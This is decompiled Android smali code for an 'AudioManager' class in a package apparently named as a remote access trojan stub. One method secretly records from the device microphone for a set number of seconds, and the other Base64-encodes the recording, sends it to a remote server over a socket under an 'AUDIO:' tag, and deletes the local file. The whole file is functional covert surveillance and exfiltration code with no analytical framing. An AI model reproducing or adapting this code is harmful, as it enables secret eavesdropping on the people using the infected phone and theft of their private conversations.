.class public Lcom/qirat/stub/AudioManager;
.super Ljava/lang/Object;
.source "AudioManager.java"


# static fields
.field private static final TAG:Ljava/lang/String; = "AudioManager"

.field private static recorder:Landroid/media/MediaRecorder;

.field private static stopRecording:Ljava/util/TimerTask;


# direct methods
.method static bridge synthetic -$$Nest$sfgetrecorder()Landroid/media/MediaRecorder;
    .locals 1

    sget-object v0, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    return-object v0
.end method

.method static bridge synthetic -$$Nest$sfputrecorder(Landroid/media/MediaRecorder;)V
    .locals 0

    sput-object p0, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    return-void
.end method

.method static bridge synthetic -$$Nest$smsendVoice(Landroid/content/Context;Ljava/io/File;)V
    .locals 0

    invoke-static {p0, p1}, Lcom/qirat/stub/AudioManager;->sendVoice(Landroid/content/Context;Ljava/io/File;)V

    return-void
.end method

.method public constructor <init>()V
    .locals 0

    .line 18
    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method

.method private static sendVoice(Landroid/content/Context;Ljava/io/File;)V
    .locals 9
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "file"    # Ljava/io/File;

    .line 87
    const-string v0, "Failed to delete temporary audio file: "

    const-string v1, "AudioManager"

    if-eqz p1, :cond_5

    invoke-virtual {p1}, Ljava/io/File;->exists()Z

    move-result v2

    if-nez v2, :cond_0

    goto/16 :goto_5

    .line 93
    :cond_0
    :try_start_0
    invoke-virtual {p1}, Ljava/io/File;->length()J

    move-result-wide v2

    long-to-int v2, v2

    .line 94
    .local v2, "size":I
    new-array v3, v2, [B

    .line 96
    .local v3, "data":[B
    new-instance v4, Ljava/io/BufferedInputStream;

    new-instance v5, Ljava/io/FileInputStream;

    invoke-direct {v5, p1}, Ljava/io/FileInputStream;-><init>(Ljava/io/File;)V

    invoke-direct {v4, v5}, Ljava/io/BufferedInputStream;-><init>(Ljava/io/InputStream;)V
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1
    .catch Lorg/json/JSONException; {:try_start_0 .. :try_end_0} :catch_0
    .catchall {:try_start_0 .. :try_end_0} :catchall_2

    .line 97
    .local v4, "buf":Ljava/io/BufferedInputStream;
    :try_start_1
    array-length v5, v3

    const/4 v6, 0x0

    invoke-virtual {v4, v3, v6, v5}, Ljava/io/BufferedInputStream;->read([BII)I

    move-result v5

    .line 98
    .local v5, "bytesRead":I
    if-ge v5, v2, :cond_1

    .line 99
    const-string v6, "Could not read the entire audio file."

    invoke-static {v1, v6}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catchall {:try_start_1 .. :try_end_1} :catchall_0

    .line 101
    .end local v5    # "bytesRead":I
    :cond_1
    :try_start_2
    invoke-virtual {v4}, Ljava/io/BufferedInputStream;->close()V

    .line 103
    .end local v4    # "buf":Ljava/io/BufferedInputStream;
    const/4 v4, 0x2

    invoke-static {v3, v4}, Landroid/util/Base64;->encodeToString([BI)Ljava/lang/String;

    move-result-object v4

    .line 105
    .local v4, "base64Audio":Ljava/lang/String;
    new-instance v5, Lorg/json/JSONObject;

    invoke-direct {v5}, Lorg/json/JSONObject;-><init>()V

    .line 106
    .local v5, "object":Lorg/json/JSONObject;
    const-string v6, "type"

    const-string v7, "audio"

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 107
    const-string v6, "name"

    invoke-virtual {p1}, Ljava/io/File;->getName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v5, v6, v7}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 108
    const-string v6, "data"

    invoke-virtual {v5, v6, v4}, Lorg/json/JSONObject;->put(Ljava/lang/String;Ljava/lang/Object;)Lorg/json/JSONObject;

    .line 111
    invoke-static {p0}, Lcom/qirat/stub/Socket;->getInstance(Landroid/content/Context;)Lcom/qirat/stub/Socket;

    move-result-object v6

    .line 112
    .local v6, "socket":Lcom/qirat/stub/Socket;
    invoke-virtual {v6}, Lcom/qirat/stub/Socket;->isConnected()Z

    move-result v7

    if-eqz v7, :cond_2

    .line 113
    const-string v7, "Sending audio to server..."

    invoke-static {v1, v7}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    .line 114
    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, "AUDIO:"

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v5}, Lorg/json/JSONObject;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v7

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Lcom/qirat/stub/Socket;->sendData(Ljava/lang/String;)V

    goto :goto_0

    .line 116
    :cond_2
    const-string v7, "Cannot send audio, socket not connected."

    invoke-static {v1, v7}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_2
    .catch Ljava/io/IOException; {:try_start_2 .. :try_end_2} :catch_1
    .catch Lorg/json/JSONException; {:try_start_2 .. :try_end_2} :catch_0
    .catchall {:try_start_2 .. :try_end_2} :catchall_2

    .line 122
    .end local v2    # "size":I
    .end local v3    # "data":[B
    .end local v4    # "base64Audio":Ljava/lang/String;
    .end local v5    # "object":Lorg/json/JSONObject;
    .end local v6    # "socket":Lcom/qirat/stub/Socket;
    :goto_0
    invoke-virtual {p1}, Ljava/io/File;->delete()Z

    move-result v2

    if-nez v2, :cond_3

    .line 123
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    goto :goto_3

    .line 96
    .restart local v2    # "size":I
    .restart local v3    # "data":[B
    .local v4, "buf":Ljava/io/BufferedInputStream;
    :catchall_0
    move-exception v5

    :try_start_3
    invoke-virtual {v4}, Ljava/io/BufferedInputStream;->close()V
    :try_end_3
    .catchall {:try_start_3 .. :try_end_3} :catchall_1

    goto :goto_1

    :catchall_1
    move-exception v6

    :try_start_4
    invoke-virtual {v5, v6}, Ljava/lang/Throwable;->addSuppressed(Ljava/lang/Throwable;)V

    .end local p0    # "context":Landroid/content/Context;
    .end local p1    # "file":Ljava/io/File;
    :goto_1
    throw v5
    :try_end_4
    .catch Ljava/io/IOException; {:try_start_4 .. :try_end_4} :catch_1
    .catch Lorg/json/JSONException; {:try_start_4 .. :try_end_4} :catch_0
    .catchall {:try_start_4 .. :try_end_4} :catchall_2

    .line 122
    .end local v2    # "size":I
    .end local v3    # "data":[B
    .end local v4    # "buf":Ljava/io/BufferedInputStream;
    .restart local p0    # "context":Landroid/content/Context;
    .restart local p1    # "file":Ljava/io/File;
    :catchall_2
    move-exception v2

    goto :goto_4

    .line 119
    :catch_0
    move-exception v2

    goto :goto_2

    :catch_1
    move-exception v2

    .line 120
    .local v2, "e":Ljava/lang/Exception;
    :goto_2
    :try_start_5
    const-string v3, "Failed to send voice data"

    invoke-static {v1, v3, v2}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I
    :try_end_5
    .catchall {:try_start_5 .. :try_end_5} :catchall_2

    .line 122
    nop

    .end local v2    # "e":Ljava/lang/Exception;
    invoke-virtual {p1}, Ljava/io/File;->delete()Z

    move-result v2

    if-nez v2, :cond_3

    .line 123
    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    :goto_3
    invoke-virtual {v2, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v2

    invoke-virtual {v0, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 126
    :cond_3
    return-void

    .line 122
    :goto_4
    invoke-virtual {p1}, Ljava/io/File;->delete()Z

    move-result v3

    if-nez v3, :cond_4

    .line 123
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v3, v0}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {p1}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v0, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v0

    invoke-virtual {v0}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v0

    invoke-static {v1, v0}, Landroid/util/Log;->w(Ljava/lang/String;Ljava/lang/String;)I

    .line 125
    :cond_4
    throw v2

    .line 88
    :cond_5
    :goto_5
    const-string v0, "Audio file is null or does not exist."

    invoke-static {v1, v0}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;)I

    .line 89
    return-void
.end method

.method public static startRecording(Landroid/content/Context;I)V
    .locals 8
    .param p0, "context"    # Landroid/content/Context;
    .param p1, "sec"    # I

    .line 32
    const-string v0, "AudioManager"

    :try_start_0
    invoke-virtual {p0}, Landroid/content/Context;->getCacheDir()Ljava/io/File;

    move-result-object v1

    .line 33
    .local v1, "dir":Ljava/io/File;
    const-string v2, "sound"

    const-string v3, ".mp3"

    invoke-static {v2, v3, v1}, Ljava/io/File;->createTempFile(Ljava/lang/String;Ljava/lang/String;Ljava/io/File;)Ljava/io/File;

    move-result-object v2

    .line 34
    .local v2, "audiofile":Ljava/io/File;
    new-instance v3, Ljava/lang/StringBuilder;

    invoke-direct {v3}, Ljava/lang/StringBuilder;-><init>()V

    const-string v4, "Audio file created at: "

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v3

    invoke-static {v0, v3}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_1

    .line 38
    nop

    .line 41
    .end local v1    # "dir":Ljava/io/File;
    :try_start_1
    new-instance v1, Landroid/media/MediaRecorder;

    invoke-direct {v1}, Landroid/media/MediaRecorder;-><init>()V

    sput-object v1, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    .line 42
    sget-object v1, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x1

    invoke-virtual {v1, v3}, Landroid/media/MediaRecorder;->setAudioSource(I)V

    .line 43
    sget-object v1, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x2

    invoke-virtual {v1, v3}, Landroid/media/MediaRecorder;->setOutputFormat(I)V

    .line 44
    sget-object v1, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    const/4 v3, 0x3

    invoke-virtual {v1, v3}, Landroid/media/MediaRecorder;->setAudioEncoder(I)V

    .line 45
    sget-object v1, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v2}, Ljava/io/File;->getAbsolutePath()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v1, v3}, Landroid/media/MediaRecorder;->setOutputFile(Ljava/lang/String;)V

    .line 46
    sget-object v1, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->prepare()V

    .line 47
    sget-object v1, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v1}, Landroid/media/MediaRecorder;->start()V

    .line 48
    const-string v1, "Recording started."

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_0

    .line 56
    nop

    .line 58
    move-object v0, v2

    .line 60
    .local v0, "finalAudiofile":Ljava/io/File;
    new-instance v1, Lcom/qirat/stub/AudioManager$1;

    invoke-direct {v1, p0, v0}, Lcom/qirat/stub/AudioManager$1;-><init>(Landroid/content/Context;Ljava/io/File;)V

    sput-object v1, Lcom/qirat/stub/AudioManager;->stopRecording:Ljava/util/TimerTask;

    .line 78
    new-instance v1, Ljava/util/Timer;

    invoke-direct {v1}, Ljava/util/Timer;-><init>()V

    sget-object v3, Lcom/qirat/stub/AudioManager;->stopRecording:Ljava/util/TimerTask;

    int-to-long v4, p1

    const-wide/16 v6, 0x3e8

    mul-long/2addr v4, v6

    invoke-virtual {v1, v3, v4, v5}, Ljava/util/Timer;->schedule(Ljava/util/TimerTask;J)V

    .line 79
    return-void

    .line 49
    .end local v0    # "finalAudiofile":Ljava/io/File;
    :catch_0
    move-exception v1

    .line 50
    .local v1, "e":Ljava/lang/Exception;
    const-string v3, "Failed to start recording"

    invoke-static {v0, v3, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 51
    sget-object v0, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    if-eqz v0, :cond_0

    .line 52
    sget-object v0, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    invoke-virtual {v0}, Landroid/media/MediaRecorder;->release()V

    .line 53
    const/4 v0, 0x0

    sput-object v0, Lcom/qirat/stub/AudioManager;->recorder:Landroid/media/MediaRecorder;

    .line 55
    :cond_0
    return-void

    .line 35
    .end local v1    # "e":Ljava/lang/Exception;
    .end local v2    # "audiofile":Ljava/io/File;
    :catch_1
    move-exception v1

    .line 36
    .local v1, "e":Ljava/io/IOException;
    const-string v2, "Failed to create temp file for recording"

    invoke-static {v0, v2, v1}, Landroid/util/Log;->e(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)I

    .line 37
    return-void
.end method
